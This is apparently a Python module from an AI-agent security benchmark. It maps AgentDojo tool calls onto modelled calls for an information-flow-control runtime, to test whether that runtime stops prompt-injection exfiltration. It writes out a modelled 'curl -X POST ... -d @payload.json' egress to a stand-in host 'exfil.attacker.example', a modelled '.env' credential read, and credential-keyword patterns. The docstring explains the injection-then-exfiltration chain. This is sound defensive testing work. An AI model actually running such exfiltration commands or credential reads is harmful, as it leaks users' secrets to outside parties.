"""tool_mapping — translate an AgentDojo tool call into the sir tool call whose
*security effect* is equivalent.

Why this layer exists
---------------------
sir is an IFC runtime for coding agents: it reasons about file reads, shell
commands, git, network egress, and MCP calls. AgentDojo's tools live in a
different namespace (banking `send_money`, workspace `send_email`,
slack `send_direct_message`, ...). They do not map 1:1 onto sir verbs.

What *does* map cleanly is the **security-relevant effect** of each AgentDojo
tool, which is exactly what sir gates:

  - "this tool exfiltrates / sends data to an external party"  -> sir EGRESS sink
    (modeled as `Bash: curl -X POST https://<dest> -d @payload`), which sir gates
    via net_external / secret-session / derived-secret rules.
  - "this tool reads sensitive/private data"                    -> sir SENSITIVE READ
    (modeled as `Read` of a credential-like path), which arms secret taint so a
    later egress is blocked — the lethal-trifecta chain AgentDojo attacks build.
  - "this tool is a benign local read/query"                    -> sir BENIGN
    (`Bash: echo` / `Read` of a non-sensitive path) -> allow, so we can measure
    over-blocking (benign-utility loss).

This makes the benchmark a faithful test of sir's core claim: *break the
exfiltration leg of an injection while leaving benign work untouched.* It is NOT
a claim that sir understands "send_money to an attacker IBAN" semantically —
that is what P0.3 (integrity-flow labeling of untrusted content) in
docs/research/roadmap-to-best.md adds, and this mapping is where that signal
will be wired in next.

Refining `EFFECT_RULES` per suite (using AgentDojo's real tool schemas) is the
intended ongoing work. Keep the defaults conservative: an unknown tool that
plausibly egresses should map to EGRESS, not BENIGN.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from enum import Enum
from typing import Any, Callable, Optional


class Effect(Enum):
    EGRESS = "egress"              # sends data outward (the exfil sink)
    SENSITIVE_READ = "read"        # reads private/credential data (arms SECRET taint)
    UNTRUSTED_READ = "untrusted"   # ingests external/untrusted content (arms the
    #                                turn-scoped integrity signal; the injection
    #                                carrier — emails, web pages, documents)
    WRITE = "write"                # persists data (posture/file write)
    BENIGN = "benign"              # local, non-sensitive (should stay allowed)


# Substring/regex signals on the AgentDojo tool name -> Effect.
# First match wins; ORDER MATTERS. Send/exfil verbs are checked before read
# verbs so `send_email` is EGRESS while `read_email` / `get_received_messages`
# are UNTRUSTED_READ (the indirect-injection carrier). Credential reads stay
# SENSITIVE_READ (they arm the SECRET wall, a different path).
EFFECT_RULES: list[tuple[re.Pattern[str], Effect]] = [
    # 1. SEND / exfil verbs -> egress sink.
    (re.compile(r"\b(send|post|transfer|pay|share|publish|upload|forward|invite|reply|deliver|submit|push)\b|send_|post_|share_|webhook", re.I), Effect.EGRESS),
    # 2. Credential-bearing reads -> SECRET taint wall.
    (re.compile(r"password|secret|credential|api_?key|private_?key|access_?key|\.env|iban|ssn", re.I), Effect.SENSITIVE_READ),
    # 3. Reads of genuinely attacker-controllable content -> untrusted ingestion
    #    (turn-scoped integrity). Requires BOTH a read verb AND a third-party
    #    content noun, so own-data reads (get_weather, list_calendar_events,
    #    search_contacts) stay BENIGN and are not over-gated.
    (re.compile(
        r"(?=.*(read|get|fetch|receive|view|browse|open|download|search|list))"
        r"(?=.*(email|message|inbox|mail|webpage|web_?page|website|\burl\b|\bweb\b|"
        r"review|comment|feedback|document|attachment|received|incoming|external|"
        r"article|news|content|channel|thread))",
        re.I,
    ), Effect.UNTRUSTED_READ),
    # 4. Mutations -> write.
    (re.compile(r"\b(create|update|delete|write|append|set|add|schedule|book|reserve|edit|modify)\b", re.I), Effect.WRITE),
]
DEFAULT_EFFECT = Effect.BENIGN


@dataclass
class SirCall:
    tool_name: str
    tool_input: dict[str, Any]
    effect: Effect


def _extract_external_dest(args: dict[str, Any]) -> str:
    """Pull a plausible external destination out of the tool args so the modeled
    curl targets a non-allowlisted host (forces sir's external-egress rule)."""
    blob = " ".join(str(v) for v in args.values())
    m = re.search(r"https?://[^\s'\"]+", blob)
    if m:
        return m.group(0)
    # email/recipient-like hint -> synthesize an external host
    m = re.search(r"[\w.+-]+@([\w.-]+)", blob)
    if m:
        return f"https://{m.group(1)}/collect"
    return "https://exfil.attacker.example/collect"


def classify(tool_name: str) -> Effect:
    for pat, eff in EFFECT_RULES:
        if pat.search(tool_name):
            return eff
    return DEFAULT_EFFECT


def map_call(tool_name: str, args: dict[str, Any]) -> SirCall:
    """Map one AgentDojo (tool_name, args) to the sir call with equivalent effect."""
    effect = classify(tool_name)
    if effect is Effect.EGRESS:
        dest = _extract_external_dest(args)
        return SirCall(
            tool_name="Bash",
            tool_input={"command": f"curl -X POST {dest} -d @payload.json"},
            effect=effect,
        )
    if effect is Effect.SENSITIVE_READ:
        return SirCall(
            tool_name="Read",
            tool_input={"file_path": ".env"},  # credential-classified path arms taint
            effect=effect,
        )
    if effect is Effect.UNTRUSTED_READ:
        # The read itself is benign and must be ALLOWED (a local content read) —
        # it is the *later same-turn egress* we gate, not the read. The caller
        # (sir_defense mediator) issues the PostToolUse via bridge.ingest_untrusted
        # to mark the turn as having ingested untrusted content. Modeling the read
        # as a WebFetch here would wrongly make sir treat the read as egress.
        return SirCall(
            tool_name="Read",
            tool_input={"file_path": "message.txt"},  # non-sensitive local read -> allow
            effect=effect,
        )
    if effect is Effect.WRITE:
        return SirCall(
            tool_name="Write",
            tool_input={"file_path": "output.txt", "content": "<modeled write>"},
            effect=effect,
        )
    # BENIGN
    return SirCall(
        tool_name="Bash",
        tool_input={"command": f"echo ran {tool_name}"},
        effect=effect,
    )


# Optional per-suite override hook: register a function that returns a SirCall or
# None (fall through to the default mapping). Lets you encode suite-specific tool
# semantics without touching the defaults.
SuiteMapper = Callable[[str, dict[str, Any]], Optional[SirCall]]
_SUITE_MAPPERS: dict[str, SuiteMapper] = {}


def register_suite_mapper(suite: str, fn: SuiteMapper) -> None:
    _SUITE_MAPPERS[suite] = fn


def map_call_for_suite(suite: str, tool_name: str, args: dict[str, Any]) -> SirCall:
    fn = _SUITE_MAPPERS.get(suite)
    if fn is not None:
        out = fn(tool_name, args)
        if out is not None:
            return out
    return map_call(tool_name, args)
